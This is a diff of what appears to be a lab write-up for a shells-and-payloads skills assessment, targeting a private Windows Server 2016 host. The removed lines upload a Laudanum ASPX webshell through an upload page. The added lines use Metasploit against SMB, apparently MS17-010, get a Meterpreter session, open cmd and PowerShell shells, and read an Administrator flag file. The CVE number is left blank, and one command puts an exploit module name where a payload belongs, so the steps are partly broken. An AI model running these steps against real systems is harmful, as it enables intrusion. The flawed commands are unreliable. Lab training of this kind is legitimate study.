@@ -355,37 +355,33 @@ We've got an smb server running an outdated version:
       445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
 
 
-
-
-- We've got an open http port, so lets see whats there:
-
-      http://172.16.1.13:80
-
-  The page reveals a file system. Which contains an upload directory, and a script upload.aspx.
-
+- This is vulnerable to CVE 
 
 ## Exploit:
 
-We've got enought to carry out an attack. First lets prepare a webshell:
+Startup msfconsole and set the RHOSTS:
 
-      cp /usr/share/laudanum/aspx/shell.aspx f.aspx
+      set RHOSTS 172.16.1.13
 
-- Edit the file to include the server ip "172.16.1.13".
+- The standard payload dosent get us a shell, so lets try a different payload and see what happens:
 
-Now navigate to "upload.aspx", and upload the file.
+      set PAYLOAD windows/smb/ms17_010_psexec
 
-- If successful we will see the mesage "f.aspx has been uploaded to uploads"
+After running the script we can see that we've got a Meterpreter session! Lets drop into a cmd.exe shell:
 
+      shell
 
+- And then to a powershell:
 
+      powershell
 
+Now we can complete the module by getting the hostname:
 
+      hostname
 
+And the flag:
 
+      cat C:\Users\Administrator\Desktop\Skills-flag.txt
 
-
-
-
-
-
+Congrats! You've just completed the Skills Assesment for Shells and Payloads!
 
